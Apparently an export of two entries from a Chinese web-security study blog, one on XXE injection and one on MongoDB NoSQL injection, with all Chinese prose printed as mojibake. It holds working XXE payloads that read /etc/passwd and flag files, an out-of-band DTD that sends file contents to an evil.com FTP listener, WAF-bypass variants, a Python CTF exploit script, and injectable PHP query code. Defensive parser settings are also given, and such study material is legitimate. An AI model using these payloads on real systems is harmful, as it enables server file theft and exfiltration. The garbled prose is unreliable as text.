<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">...</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;param1&gt;name&lt;&#x2F;param1&gt;</span><br><span class="line">&lt;param2&gt;&amp;xxe;&lt;&#x2F;param2&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹æ˜¯å¦å¯ä»¥è¯»å–æ•æ„Ÿæ–‡ä»¶ã€‚</p>
<h3 id="åˆ©ç”¨FTPåè®®è·å–æ•æ„Ÿä¿¡æ¯">åˆ©ç”¨FTPåè®®è·å–æ•æ„Ÿä¿¡æ¯</h3>
<p>åˆ©ç”¨ftpåè®®è·å–æœåŠ¡å™¨ä¿¡æ¯/å†…ç½‘ipä¹‹ç±»çš„æŠ€å·§ï¼š<br>
åœ¨æ”»å‡»è€…æœåŠ¡å™¨ä¸Šè¿è¡Œrbè„šæœ¬(æ¨¡æ‹ŸFTPæœåŠ¡å™¨:<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb</a>),ç›‘å¬8080ç«¯å£ã€‚<br>
ç„¶ååœ¨webç¨‹åºé‚£é‡Œè¾“å…¥payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">   &lt;!ENTITY % asd SYSTEM &quot;http:&#x2F;&#x2F;evil.com&#x2F;ext.dtd&quot;&gt; </span><br><span class="line">   %asd; </span><br><span class="line">   %rrr; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<p>ext.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &#39;ftp:&#x2F;&#x2F;evil.com:8000&#x2F;%b;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>ç„¶ååœ¨æ¨¡æ‹Ÿçš„FTPæœåŠ¡å™¨ä¸Šå°±ä¼šæ”¶åˆ°ä¸€äº›æœåŠ¡å™¨ä¿¡æ¯/æ–‡ä»¶å†…å®¹</p>
<p>æŠ€å·§æ¥è‡ªï¼š<a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a></p>
<h3 id="Bypass">Bypass</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE :. SYTEM &quot;http:&#x2F;&#x2F;&quot;</span><br><span class="line">&lt;!DOCTYPE :_-_: SYTEM &quot;http:&#x2F;&#x2F;&quot;</span><br><span class="line">&lt;!DOCTYPE &#123;0xdfbf&#125; SYSTEM &quot;http:&#x2F;&#x2F;&quot;</span><br></pre></td></tr></table></figure>
<h2 id="XXEå¦‚ä½•é˜²å¾¡">XXEå¦‚ä½•é˜²å¾¡</h2>
<p>1ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•<br>
php:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>
<p>java:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure>
<p>Python:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure>
<p>2ã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®<br>
è¿‡æ»¤å…³é”®å­—ï¼š<code>&lt;\!DOCTYPE</code>å’Œ<code>&lt;\!ENTITY</code>ï¼Œæˆ–è€…<code>SYSTEM</code>å’Œ<code>PUBLIC</code>ã€‚<br>
3ã€ä¸å…è®¸XMLä¸­å«æœ‰è‡ªå·±å®šä¹‰çš„DTD</p>
<h2 id="CTFä¸­çš„XXE">CTFä¸­çš„XXE</h2>
<h3 id="apiè°ƒç”¨">apiè°ƒç”¨</h3>
<p>é¢˜ç›®åœ°å€ï¼š<a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p>
<p>é¢˜ç›®æè¿°ï¼šè¯·è®¾æ³•è·å¾—ç›®æ ‡æœºå™¨/home/ctf/flag.txtä¸­çš„flagå€¼ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226122019.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226135052.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226135232.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226135314.png" alt=""></p>
<h3 id="Fake-XML-Cookbook">Fake XML Cookbook</h3>
<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<p>é¢˜ç›®è¯´æ˜ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;Difficulty: easy&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">flag is in &#x2F;flag</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;Author zjy&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/php_xxe/doLogin.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY foo SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;user&gt;&lt;username&gt;&amp;foo;&lt;/username&gt;&lt;password&gt;0&lt;/password&gt;&lt;/user&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url,data=payload,headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/xml&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>
<h3 id="True-XML-cookbook">True XML cookbook</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226154009.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226153933.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226153418.png" alt=""></p>
<h3 id="CSAWQual-2019-Web-Unagi">[CSAWQual 2019]Web_Unagi</h3>
<p>ä½¿ç”¨utf-16ç¼–ç ç»•è¿‡WAFä¸Šä¼ xmlæ–‡ä»¶è¯»å–flag</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&quot;utf-16&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">users</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">username</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span> <span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>utf-16ç¼–ç </p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200916104241.png" alt=""></p>
<p>ä¸Šä¼ </p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200916104413.png" style="zoom:67%;" />
<h2 id="Update">Update</h2>
<p><a href="https://www.freebuf.com/vuls/207639.html">https://www.freebuf.com/vuls/207639.html</a></p>
<p>æ— æ³•å¼•ç”¨å¤–éƒ¨DTDæ–‡ä»¶çš„å‰æä¸‹ï¼Œæ— å›æ˜¾åˆ©ç”¨XXEæ³¨å…¥ï¼š</p>
<h3 id="å¼•ç”¨å†…éƒ¨å®ä½“">å¼•ç”¨å†…éƒ¨å®ä½“</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file:&#x2F;&#x2F;hhhhhhhh&#x2F;?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;send;</span><br><span class="line">    &#39;&gt; </span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure>
<h3 id="ä¸‰å±‚åµŒå¥—">ä¸‰å±‚åµŒå¥—</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#39;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;&#x2F;message</span><br></pre></td></tr></table></figure>
<h2 id="Reference">Reference</h2>
<p>xxe injector toolï¼š<a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></p>
<p>XXE payload listï¼š<a href="https://github.com/payloadbox/xxe-injection-payload-list">https://github.com/payloadbox/xxe-injection-payload-list</a></p>
<p><a href="https://xz.aliyun.com/t/3357">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´</a></p>
<p><a href="https://p0rz9.github.io/2019/02/27/xxe/">XXEæ¼æ´æ€»ç»“</a></p>
<p><a href="https://v0w.top/2019/01/20/XXE-note/#4-http%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B">XXEå­¦ä¹ ç¬”è®°</a></p>
<p><a href="https://ctfbook.ph0en1x.com/web/zhu-ru/xmlshi-ti-zhu-ru">XXEå®ä½“æ³¨å…¥</a></p>
<p><a href="http://gv7.me/articles/2018/think-about-blind-xxe-payload/">Blind XXEç»å…¸payloadå¼•å‘çš„è„‘æ´</a></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨å­¦ä¹ </tag>
        <tag>xxeæ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>NoSQLæ³¨å…¥ä¹‹MongoDB</title>
    <url>/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/</url>
    <content><![CDATA[<blockquote>
<p>æ–‡ç« é¦–å‘äº ä¿¡å®‰ä¹‹è·¯ å…¬ä¼—å·</p>
</blockquote>
<h1 id="NoSQLæ³¨å…¥ä¹‹MongoDB">NoSQLæ³¨å…¥ä¹‹MongoDB</h1>
<h2 id="0x01-NoSQLå’ŒMongoDB">0x01 NoSQLå’ŒMongoDB</h2>
<h3 id="NoSQL">NoSQL</h3>
<p>NoSQLçš„æ¦‚å¿µå°±ä¸èµ˜è¿°äº†ï¼Œä»¥ä¸‹æ‘˜è‡ªèœé¸Ÿæ•™ç¨‹ã€‚</p>
<p>NoSQLï¼ŒæŒ‡çš„æ˜¯éå…³ç³»å‹çš„æ•°æ®åº“ã€‚NoSQLæœ‰æ—¶ä¹Ÿç§°ä½œNot Only SQLçš„ç¼©å†™ï¼Œæ˜¯å¯¹ä¸åŒäºä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ç»Ÿç§°ã€‚NoSQLç”¨äºè¶…å¤§è§„æ¨¡æ•°æ®çš„å­˜å‚¨ã€‚ï¼ˆä¾‹å¦‚è°·æ­Œæˆ–Facebookæ¯å¤©ä¸ºä»–ä»¬çš„ç”¨æˆ·æ”¶é›†ä¸‡äº¿æ¯”ç‰¹çš„æ•°æ®ï¼‰ã€‚è¿™äº›ç±»å‹çš„æ•°æ®å­˜å‚¨ä¸éœ€è¦å›ºå®šçš„æ¨¡å¼ï¼Œæ— éœ€å¤šä½™æ“ä½œå°±å¯ä»¥æ¨ªå‘æ‰©å±•ã€‚</p>
<h3 id="MongoDB">MongoDB</h3>
<p>è¯¦ç»†æ¦‚å¿µå»ºè®®ç›´æ¥çœ‹æ•™ç¨‹ <a href="http://www.runoob.com/mongodb/mongodb-tutorial.html">ä¼ é€é—¨ğŸšª</a>ï¼Œè¿™é‡Œå°±ç®€å•çš„æ€»ç»“å‡ å¥ã€‚</p>
<p>åœ¨MySQLä¸­ï¼Œæˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„å‡ ä¸ªæœ€å¸¸è§çš„æ¦‚å¿µæ˜¯æ•°æ®åº“(Database)ã€è¡¨(Table)ã€å­—æ®µ(Column)ã€è®°å½•(Record)ã€ç´¢å¼•(Index)ï¼Œè¿™äº›æœ¯è¯­æ˜ å°„åˆ°MongoDBä¸­å¤§æ¦‚ç­‰ä»·äºæ•°æ®åº“(Database)ã€é›†åˆ(Collection)ã€åŸŸ(Field)ã€æ–‡æ¡£(Document)ã€ç´¢å¼•(Index)ã€‚ä¸‹é¢å°±é€šè¿‡å®˜ç½‘æ–‡æ¡£çš„å‡ å¼ å›¾ç•¥ä½œè§£é‡Šã€‚</p>
<p>æ–‡æ¡£æ˜¯ç”±ä¸€ç»„é”®å€¼(key-value)å¯¹(å³ BSONï¼ŒBinary JSON)ç»„æˆã€‚MongoDB çš„æ–‡æ¡£ä¸éœ€è¦è®¾ç½®ç›¸åŒçš„å­—æ®µï¼Œå¹¶ä¸”ç›¸åŒçš„å­—æ®µä¸éœ€è¦ç›¸åŒçš„æ•°æ®ç±»å‹ï¼Œä¾‹å¦‚ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315141435.png" alt=""></p>
<p>é›†åˆå°±æ˜¯ MongoDB æ–‡æ¡£ç»„ï¼Œé›†åˆå­˜åœ¨äºæ•°æ®åº“ä¸­ï¼Œé›†åˆæ²¡æœ‰å›ºå®šçš„ç»“æ„ï¼Œè¿™æ„å‘³ç€ä½ å¯¹é›†åˆå¯ä»¥æ’å…¥ä¸åŒæ ¼å¼å’Œç±»å‹çš„æ•°æ®ï¼Œä½†é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬æ’å…¥é›†åˆçš„æ•°æ®éƒ½ä¼šæœ‰ä¸€å®šçš„å…³è”æ€§ã€‚ä¸‹é¢è¿™å¼ å›¾å±•ç¤ºäº†è¿™ä¸‰è€…ä¹‹é—´çš„å…³ç³»ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315141816.png" alt=""></p>
<p>å¥½äº†ï¼Œå‰ç½®çŸ¥è¯†éƒ¨åˆ†ä»‹ç»åˆ°è¿™é‡Œï¼Œä¸‹é¢å¼€å§‹ä»Šå¤©çš„æ­£æ–‡éƒ¨åˆ†ï¼šMongoDBæ³¨å…¥</p>
<h2 id="0x02-NoSQLæ³¨å…¥">0x02 NoSQLæ³¨å…¥</h2>
<p>è®²MangoDBæ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå¤§è‡´äº†è§£ä¸€ä¸‹æ•´ä¸ªNoSQLæ³¨å…¥çš„æµç¨‹ï¼Œä¸‹é¢è¿™å¼ å›¾æ¥è‡ªOWASPï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315112801.png" alt=""></p>
<p>NoSQLæä¾›äº†æ–°çš„æ•°æ®æ¨¡å‹å’ŒæŸ¥è¯¢æ ¼å¼ï¼Œä»è€Œå¯ä»¥è§„é¿å¸¸è§„çš„SQLæ³¨å…¥æ”»ã€‚ä½†æ˜¯ï¼Œå®ƒä»¬ä¹Ÿä¸ºæ”»å‡»è€…æä¾›äº†æ’å…¥æ¶æ„ä»£ç çš„æ–°æ–¹æ³•ã€‚æ€»çš„æ¥è®²æœ‰å››ç§æ³¨å…¥æ‰‹æ³•ï¼š</p>
<p><strong>é‡è¨€å¼</strong></p>
<p>åˆç§°ä¸ºæ°¸çœŸå¼ï¼ˆè¿™ä¸ªå¥½åƒæ˜¯æ•°ç†é€»è¾‘é‡Œé¢çš„æœ¯è¯­ï¼‰ï¼Œæ­¤ç±»æ”»å‡»æ˜¯åœ¨æ¡ä»¶è¯­å¥ä¸­æ³¨å…¥ä»£ç ï¼Œä½¿ç”Ÿæˆçš„è¡¨è¾¾å¼åˆ¤å®šç»“æœæ°¸è¿œä¸ºçœŸï¼Œä»è€Œç»•è¿‡è®¤è¯æˆ–è®¿é—®æœºåˆ¶ã€‚</p>
<p><strong>è”åˆæŸ¥è¯¢</strong></p>
<p>è”åˆæŸ¥è¯¢æ˜¯ä¸€ç§ä¼—æ‰€å‘¨çŸ¥çš„SQLæ³¨å…¥æŠ€æœ¯ï¼Œæ”»å‡»è€…åˆ©ç”¨ä¸€ä¸ªè„†å¼±çš„å‚æ•°å»æ”¹å˜ç»™å®šæŸ¥è¯¢è¿”å›çš„æ•°æ®é›†ã€‚è”åˆæŸ¥è¯¢æœ€å¸¸ç”¨çš„ç”¨æ³•æ˜¯ç»•è¿‡è®¤è¯é¡µé¢è·å–æ•°æ®ã€‚</p>
<p><strong>JavaScriptæ³¨å…¥</strong></p>
<p>MongoDB Serveræ”¯æŒJavaScriptï¼Œè¿™ä½¿å¾—åœ¨æ•°æ®å¼•æ“è¿›è¡Œå¤æ‚äº‹åŠ¡å’ŒæŸ¥è¯¢æˆä¸ºå¯èƒ½ï¼Œä¼ é€’ä¸å¹²å‡€çš„ç”¨æˆ·è¾“å…¥åˆ°è¿™äº›æŸ¥è¯¢ä¸­å¯ä»¥æ³¨å…¥ä»»æ„JavaScriptä»£ç ï¼Œå¯¼è‡´éæ³•çš„æ•°æ®è·å–æˆ–ç¯¡æ”¹ã€‚</p>
<p><strong>ç›²æ³¨</strong></p>
<p>å½“é¡µé¢æ²¡æœ‰å›æ˜¾æ—¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>$regex</code>æ­£åˆ™è¡¨è¾¾å¼æ¥è¾¾åˆ°å’ŒSQLæ³¨å…¥ä¸­<code>substr()</code>å‡½æ•°ç›¸åŒçš„åŠŸèƒ½ï¼Œè€Œä¸”NoSQLç”¨åˆ°çš„åŸºæœ¬ä¸Šéƒ½æ˜¯å¸ƒå°”ç›²æ³¨ã€‚</p>
<h2 id="0x03-PHP-MongoDBæ³¨å…¥">0x03 PHP MongoDBæ³¨å…¥</h2>
<p>åœ¨PHPä¸­ä½¿ç”¨MongoDBä½ å¿…é¡»ä½¿ç”¨ MongoDB çš„ <a href="https://pecl.php.net/package/mongodb">PHPé©±åŠ¨</a>ï¼Œå®˜ç½‘ä¸Šå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šç‰ˆæœ¬ï¼Œå…¶ä¸­1.0.0ç‰ˆæœ¬ä¹‹åï¼Œphp_mongodb.dllå°†ä¸å†æ”¯æŒ<code>MongoClient</code>ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>$m = new MongoClient(&quot;mongodb://localhost:27017&quot;);</code>è¿™ç§è°ƒç”¨æ–¹å¼å·²ç»è¢«æ·˜æ±°ï¼Œè€Œæ˜¯ç”¨å‘½åç©ºé—´çš„æ–¹å¼ï¼Œä½†æ˜¯æ³¨å…¥çš„æ‰‹æ³•å’ŒåŸç†æ˜¯å·®ä¸å¤šçš„ï¼Œè¿™é‡Œå°±ä¸»è¦ä»‹ç»ä¸€ä¸‹æ–°ç‰ˆPHPé©±åŠ¨è¿›è¡ŒæŸ¥è¯¢æ“ä½œMongoDBçš„ä¸‰ç§æ–¹æ³•ï¼ˆä¸€èˆ¬æ³¨å…¥ä¹Ÿæ˜¯å‘ç”Ÿåœ¨æŸ¥è¯¢è¯­å¥ä¸­ï¼‰ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œå‡ä»¥GETè¯·æ±‚æ–¹å¼ä¸ºä¾‹ã€‚</p>
<p>æµ‹è¯•ç¯å¢ƒ</p>
<ul>
<li>win10</li>
<li>PHP 7.3.4</li>
<li>MongoDB Server 4.2</li>
<li>php_mongodb.dll 1.7.4</li>
</ul>
<h3 id="é‡è¨€å¼æ³¨å…¥">é‡è¨€å¼æ³¨å…¥</h3>
<p>åˆ©ç”¨<code>executeQuery</code>ç›´æ¥æŸ¥è¯¢ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># è¿æ¥æ•°æ®åº“</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">&quot;mongodb://localhost:27017&quot;</span>);</span><br><span class="line"></span><br><span class="line">$uname = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢è¯­å¥</span></span><br><span class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span> =&gt; $uname,</span><br><span class="line">    <span class="string">&#x27;pwd&#x27;</span> =&gt; $pwd</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œè¯­å¥</span></span><br><span class="line">$result = $manager-&gt;executeQuery(<span class="string">&#x27;test.users&#x27;</span>, $query)-&gt;toArray();</span><br><span class="line"></span><br><span class="line">$count = count($result);</span><br><span class="line"><span class="keyword">if</span> ($count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        $user = ((<span class="keyword">array</span>)$user);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span> . $user[<span class="string">&#x27;uname&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span> . $user[<span class="string">&#x27;pwd&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Not Found&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¼ é€’çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ¯”è¾ƒå®‰å…¨ã€‚è¿™ç§å½¢å¼å« <code>ODM</code>ï¼Œå®ƒä¼šå¸®ä½ è¿‡æ»¤æ•°æ®ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸ç”¨æ‹…å¿ƒåŸè¯­å¥è¢«ç ´åã€‚</p>
<blockquote>
<p><code>ORM</code> å¯¹åº”å…³ç³»å‹æ•°æ®åº“ï¼Œå¦‚ MySQLï¼›<code>ODM</code> å¯¹åº”æ–‡æ¡£å‹æ•°æ®åº“ï¼Œå¦‚ MongoDBã€‚</p>
</blockquote>
<p>å½“æˆ‘ä»¬ç”¨å…¬å…±ç”¨æˆ·ca01hè¾“å…¥æ—¶ï¼Œæ˜¾ç¤ºå‡ºusernameå’Œpasswordï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315145255.png" alt=""></p>
<p>è¿™æ˜¯ä¸€ä¸ªæ­£å¸¸çš„è¾“å…¥ï¼Œæ•°æ®å¤„ç†è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315155248.png" alt=""></p>
<p>PHPå…è®¸æœ€ç»ˆç”¨æˆ·é€šè¿‡å°†URLå‚æ•°æ›´æ”¹ä¸ºå¸¦æœ‰æ–¹æ‹¬å·çš„å‚æ•°æ¥å°†GETæŸ¥è¯¢å­—ç¬¦ä¸²è¾“å…¥æ›´æ”¹ä¸ºæ•°ç»„ï¼Œæˆ‘ä»¬è¯•ä¸€ä¸‹è¿™ç§è¾“å…¥ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315153912.png" alt=""></p>
<blockquote>
<p>$neå³not equalä¸ç­‰äº</p>
</blockquote>
<p>amazing~æ‰€æœ‰ç”¨æˆ·éƒ½æŸ¥å‡ºæ¥äº†ï¼Œå†çœ‹ä¸€ä¸‹æ•°æ®å¤„ç†è¿‡ç¨‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315154547.png" alt=""></p>
